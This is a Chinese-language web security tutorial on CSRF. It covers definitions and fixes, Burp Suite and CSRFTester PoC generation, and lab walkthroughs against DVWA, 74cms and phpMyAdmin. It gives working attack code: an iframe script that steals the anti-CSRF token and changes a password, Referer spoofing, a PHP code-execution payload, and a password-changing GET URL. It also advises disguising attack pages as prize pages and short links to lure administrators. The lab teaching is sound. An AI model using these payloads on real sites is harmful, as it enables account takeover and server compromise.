# 1.1 CSRF漏洞
# 1.1.1 CSRF漏洞简介
CSRF（跨站请求伪造），是指利用受害者尚未失效的身份认证信息（ cookie、会话
等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下
以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作
（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用
# 1.1.2 CSRF漏洞分类
## 1.1.2.1 GET型
GET型CSRF漏洞，只需要构造URL，然后诱导受害者访问利用。
## 1.1.2.2 POST型
POST型CSRF漏洞，需要构造自动提交或点击提交的表单，然后诱导受害者访问或点击利用。
# 1.1.3 CSRF漏洞危害
未验证 Referer或者使用 Token 导致用户或者管理员可被 CSRF添加、修改、删除等操作
# 1.1.4 CSRF漏洞修复方案
1、添加随机token值，并验证。
2、验证Referer
3、关键请求使用验证码功能
# 1.2 CSRF漏洞利用
# 1.2.1 利用思路
寻找增删改的地方，构造HTML，修改HTML表单中某些参数，使用浏览器打开该HTML，点击提交表单后查看响应结果，看该操作是否成功执行。
# 1.2.2 工具使用
## 1.2.2.1 burpsuite
使用burpsuite中Engagement tools的Generate CSRF PoC模块
右击要csrf攻击的url，选择Generate CSRF POC模块
![图片](https://uploader.shimo.im/f/M20ZOoMcTFsniLTB.png!thumbnail)
然后就构造好了攻击脚本，value就是要修改成的密码
![图片](https://uploader.shimo.im/f/nmPrUDkd0SopQRzp.png!thumbnail)
Test in browser一般用于自己测试用
![图片](https://uploader.shimo.im/f/SCbK8CqUbpYmelwU.png!thumbnail)
然后点击copy
![图片](https://uploader.shimo.im/f/wuxF4nBhU0E3X0xI.png!thumbnail)
然后用代理burpsuite的浏览器打开
![图片](https://uploader.shimo.im/f/RK0oOjZF41MlwaAz.png!thumbnail)
点击submit request即可修改成功密码
![图片](https://uploader.shimo.im/f/YmlySWp2u4gTqTE0.png!thumbnail)
Copy HTML 一般用于攻击其他人，复制下代码保存为HTML文档
可以简单修改个中奖页面，诱惑受害者点击
![图片](https://uploader.shimo.im/f/rGvTOEVfRH0ZWbzj.png!thumbnail)
![图片](https://uploader.shimo.im/f/9SjG21HEvsslrDcF.png!thumbnail)
点击领奖成功修改密码
![图片](https://uploader.shimo.im/f/f8DXVmrpFhwyPxoK.png!thumbnail)
## 1.2.2.2 CSRFTester
下载地址：[https://www.owasp.org/index.php/File:CSRFTester-1.0.zip](https://www.owasp.org/index.php/File:CSRFTester-1.0.zip)
![图片](https://uploader.shimo.im/f/3P1VPLyUlUg65p24.png!thumbnail)
下载后点击run.bat
![图片](https://uploader.shimo.im/f/Sj9NRiMTah0wUM0j.png!thumbnail)
正常打开，并监听8008端口，需要把浏览器代理设置为8008
![图片](https://uploader.shimo.im/f/ICKgLALaTZgPctg8.png!thumbnail)
点击Start Recording，开启CSRFTester检测工作，我们这里抓添加管理员的数据包
![图片](https://uploader.shimo.im/f/p38wwZm0uGc5rmVz.png!thumbnail)
然后右击删除没用的数据包
![图片](https://uploader.shimo.im/f/T2Rf8ZGHOH8vaEWr.png!thumbnail)
点击Generate HTML生成CSRF攻击脚本，我们这次添加test1账号
![图片](https://uploader.shimo.im/f/BswavjGy8CgFPEXy.png!thumbnail)
打开此文件，成功添加账号
![图片](https://uploader.shimo.im/f/g3GBobq9nuURlzVP.png!thumbnail)
# 1.2.2 CSRF漏洞利用实例之DVWA
### 1.2.2.1 安装步骤
[下载地址：https://codeload.github.com/ethicalhack3r/DVWA/zip/master](https://codeload.github.com/ethicalhack3r/DVWA/zip/master)
漏洞环境：windows、phpstudy
先把config目录下config.inc.php.dist文件名修改为config.inc.php，数据库密码修改为自己的。
![图片](https://uploader.shimo.im/f/3YyMeov80942lbs9.png!thumbnail)
然后访问dvwa，因为csrf漏洞不涉及红色部分配置，直接创建即可
![图片](https://uploader.shimo.im/f/LU8RSHdRIqUVJn9r.png!thumbnail)
创建成功，账号密码是admin/password
![图片](https://uploader.shimo.im/f/2h8AKY9XeosEJZak.png!thumbnail)
这里可以调相应的安全等级
![图片](https://uploader.shimo.im/f/sIu819rAWKEzb53o.png!thumbnail)
### 1.2.2.2 low等级
从代码中可以看出未作任何防御，直接更改密码。
```
if( isset( $_GET[ 'Change' ] ) ) {
   // Get input
   $pass_new  = $_GET[ 'password_new' ];
   $pass_conf = $_GET[ 'password_conf' ];

   // Do the passwords match?
   if( $pass_new == $pass_conf ) {
      // They do!
      $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
      $pass_new = md5( $pass_new );

      // Update the database
      $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
      $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

      // Feedback for the user
      $html .= "<pre>Password Changed.</pre>";
   }
   else {
      // Issue with passwords matching
      $html .= "<pre>Passwords did not match.</pre>";
   }

   ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
```
先使用burpsuite进行抓修改密码的数据包
![图片](https://uploader.shimo.im/f/81T388bWKG4Yxo6W.png!thumbnail)
再使用Generate CSRF PoC进行构造poc
![图片](https://uploader.shimo.im/f/V1eiU8DiQ9ktnUs4.png!thumbnail)
CSRF HTML中的代码是构造好的
![图片](https://uploader.shimo.im/f/Tg4yC6ajfJIWrVrW.png!thumbnail)
把构造好的代码复制出来，复制到自己创建的HTML文件里，value里的值是要修改成的密码。
![图片](https://uploader.shimo.im/f/W10C0d0cfTUjkGaa.png!thumbnail)
点击submit request即可修改
![图片](https://uploader.shimo.im/f/LdmBkTQvBdAhl1ks.png!thumbnail)
修改成功
![图片](https://uploader.shimo.im/f/U1JEMIGrYtIKCxXG.png!thumbnail)
### 1.2.2.3 medium等级
从代码中可以看出先检测referer是否包含主机名称，再进行更改密码。
```
if( isset( $_GET[ 'Change' ] ) ) {
   // Checks to see where the request came from
   if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
      // Get input
      $pass_new  = $_GET[ 'password_new' ];
      $pass_conf = $_GET[ 'password_conf' ];

      // Do the passwords match?
      if( $pass_new == $pass_conf ) {
         // They do!
         $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
         $pass_new = md5( $pass_new );

         // Update the database
         $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
         $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

         // Feedback for the user
         $html .= "<pre>Password Changed.</pre>";
      }
      else {
         // Issue with passwords matching
         $html .= "<pre>Passwords did not match.</pre>";
      }
   }
   else {
      // Didn't come from a trusted source
      $html .= "<pre>That request didn't look correct.</pre>";
   }

   ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
```
先看下phpinfo中SERVER_NAME是什么
![图片](https://uploader.shimo.im/f/GYqRE91gnPE1U3pq.png!thumbnail)
访问poc，并抓包修改referer，添加localhost进行绕过
![图片](https://uploader.shimo.im/f/2cRDb9JOsi4odTwx.png!thumbnail)
修改成功
![图片](https://uploader.shimo.im/f/bei0UwZNfaUAfAdM.png!thumbnail)
### 1.2.2.4 high等级
从代码可以看出增加了Anti-CSRF token机制，用户每次访问更改页面时，服务器都会返回一个随机token，向服务器发送请求时，并带上随机token，服务端接收的时候先对token进行检查是否正确，才会处理客户端请求。
```
if( isset( $_GET[ 'Change' ] ) ) {
   // Check Anti-CSRF token
   checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

   // Get input
   $pass_new  = $_GET[ 'password_new' ];
   $pass_conf = $_GET[ 'password_conf' ];

   // Do the passwords match?
   if( $pass_new == $pass_conf ) {
      // They do!
      $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
      $pass_new = md5( $pass_new );

      // Update the database
      $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
      $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

      // Feedback for the user
      $html .= "<pre>Password Changed.</pre>";
   }
   else {
      // Issue with passwords matching
      $html .= "<pre>Passwords did not match.</pre>";
   }

   ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
```
generateSessionToken();

要绕过Anti-CSRF token机制，首先要获取token，再使用这个token进行修改密码。
然后构造以下代码
```
<html>
<body>
<script type="text/javascript">
    function attack()
  {
   document.getElementsByName('user_token')[0].value=document.getElementById("hack").contentWindow.document.getElementsByName('user_token')[0].value;
  document.getElementById("transfer").submit(); 
  }

</script>
<iframe src="http://192.168.1.108/dvwa/vulnerabilities/csrf" id="hack" border="0" style="display:none;">

</iframe>
<body onload="attack()">

  <form method="GET" id="transfer" action="http://192.168.1.108/dvwa/vulnerabilities/csrf">

   <input type="hidden" name="password_new" value="hongri">

    <input type="hidden" name="password_conf" value="hongri">

   <input type="hidden" name="user_token" value="">

  <input type="hidden" name="Change" value="Change">

   </form>

</body>
</html>
```
访问后就立即修改密码
![图片](https://uploader.shimo.im/f/wOPXowawXgM6U0Ff.png!thumbnail)
### 1.2.2.5 参考文章
[https://www.freebuf.com/articles/web/118352.html](https://www.freebuf.com/articles/web/118352.html)
# 1.2.3 CSRF漏洞利用实例之骑士cms
### 1.2.3.1 安装步骤
骑士cms下载地址：[http://www.74cms.com/download/load/id/155.html](http://www.74cms.com/download/load/id/155.html)
漏洞环境：windows、phpstudy
存在漏洞：POS型CSRF、代码执行

下载解压，访问首页
![图片](https://uploader.shimo.im/f/gLOJSwqpyJUfqRyy.png!thumbnail)
填写信息
![图片](https://uploader.shimo.im/f/C483L2m5JJsgw41r.png!thumbnail)
安装完成
![图片](https://uploader.shimo.im/f/M5fbmk0Tzb4nfFGc.png!thumbnail)
### 1.2.3.2 利用过程
安装好后，进入添加管理员界面进行抓包
![图片](https://uploader.shimo.im/f/wRzubP3gHqw9LfrF.png!thumbnail)
![图片](https://uploader.shimo.im/f/ZAx3cBhZCCQeEOAW.png!thumbnail)
使用Generate CSRF PoC生成HTML代码，并添加个中奖图片，简单伪装成中奖页面。
![图片](https://uploader.shimo.im/f/NtbZuEJA1DkI5Y1u.png!thumbnail)![图片](https://uploader.shimo.im/f/zx3ulSy5jC02TR9q.png!thumbnail)
还可以用短域名继续伪装
![图片](https://uploader.shimo.im/f/e5hhO2GcJyk7dfkI.png!thumbnail)
然后诱导管理员打开并点击，创建成功
![图片](https://uploader.shimo.im/f/7rlDBQ33tbAGZWqF.png!thumbnail)
使用创建的账号密码登录
![图片](https://uploader.shimo.im/f/bIhLG6RcDjw1BkFl.png!thumbnail)
使用代码执行漏洞执行phpinfo
poc：index.php?m=Admin&c=Tpl&a=set&tpl_dir=a'.${phpinfo()}.'
![图片](https://uploader.shimo.im/f/Vka5drISLV4UxpuN.png!thumbnail)
### 1.2.3.3 参考文章
[http://www.yqxiaojunjie.com/index.php/archives/341/](http://www.yqxiaojunjie.com/index.php/archives/341/)
# 1.2.4 CSRF漏洞利用实例之phpMyAdmin
### 1.2.4.1 安装步骤
此漏洞使用VulnSpy在线靶机
靶机地址：[https://www.vulnspy.com/?u=pmasa-2017-9](https://www.vulnspy.com/?u=pmasa-2017-9)
存在漏洞：GET型CSRF
点击开启实验
![图片](https://uploader.shimo.im/f/niPGVv5yRjA5NBWE.png!thumbnail)
可以登录也可以不登录
![图片](https://uploader.shimo.im/f/G1EW1lc2ZysnBwa5.png!thumbnail)
打开靶机地址，默认账号密码：root/toor，靶机只有十分钟的时间
![图片](https://uploader.shimo.im/f/I1mvhB38VocZ6ecp.png!thumbnail)
### 1.2.4.2 利用过程
将当前用户密码更改为hongri，SQL命令
```
SET passsword=PASSWORD('hongri');
```
构造poc
```
http://f1496b741e86dce4b2f79f3e839f977d.vsplate.me:19830/pma/sql.php?db=mysql&table=user&sql_query=SET%20password
%20=%20PASSWORD(%27hongri%27)
```

我们可以使用短域名伪装
![图片](https://uploader.shimo.im/f/DeIPRNyr47UA0sUG.png!thumbnail)
修改成功
![图片](https://uploader.shimo.im/f/4ReaCGjcicEAuiIv.png!thumbnail)
### 1.2.4.3 参考文章
[https://www.vulnspy.com/?u=pmasa-2017-9](https://www.vulnspy.com/?u=pmasa-2017-9)
